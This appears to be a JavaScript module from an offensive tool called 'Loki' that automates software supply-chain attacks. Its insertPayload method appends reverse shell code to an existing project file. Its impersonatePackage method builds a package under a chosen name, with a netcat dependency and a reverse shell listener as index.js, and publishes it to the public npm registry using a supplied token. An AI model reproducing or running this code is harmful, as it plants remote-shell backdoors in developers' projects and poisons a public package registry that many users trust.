'use strict'

import fs from 'fs'
import pack from 'libnpmpack'
import { publish } from 'libnpmpublish'
import ReverseShellGenerator from './ReverseShellGenerator.js'
// npmjs default registry
const OPTS = {
    registry: 'https://registry.npmjs.org/'
}

class PackageManager {
    constructor({ pkg, version, directory, token, shell_data }) {
        this.pkg = pkg
        this.version = version
        this.base_directory = directory
        this.loki_directory = `${this.base_directory}/_loki_packages`
        this.directory = `${this.loki_directory}/${this.pkg}`
        this.token = token
        this.shell_data = shell_data
    }

    insertPayload(file) {
        console.log(`${this.base_directory}/${file}`)
        fs.appendFileSync(`${this.base_directory}/${file}`, (new ReverseShellGenerator(this.shell_data)).opener())
        return true
    }

    async impersonatePackage() {
        fs.mkdirSync(this.directory, { recursive: true })

        const package_json = JSON.stringify({
            name: this.pkg,
            version: this.version,
            private: false,
            dependencies: {
                "netcat": "^1.5.0",
            }
        })
        fs.writeFileSync(`${this.directory}/package.json`, package_json)

        const index_js = new ReverseShellGenerator(this.shell_data).listener()
        fs.writeFileSync(`${this.directory}/index.js`, index_js)

        const manifest = {
            name: this.pkg,
            version: this.version,
            description: 'Loki automation package'
        }
        const tarData = await pack(`file:${this.directory}`, { ...OPTS})

        return {
            manifest,
            job: publish(manifest, tarData, {
                ...OPTS,
                npmVersion: this.version,
                forceAuth: {
                    token: this.token
                }
            })
        }
    }
}

export default PackageManager
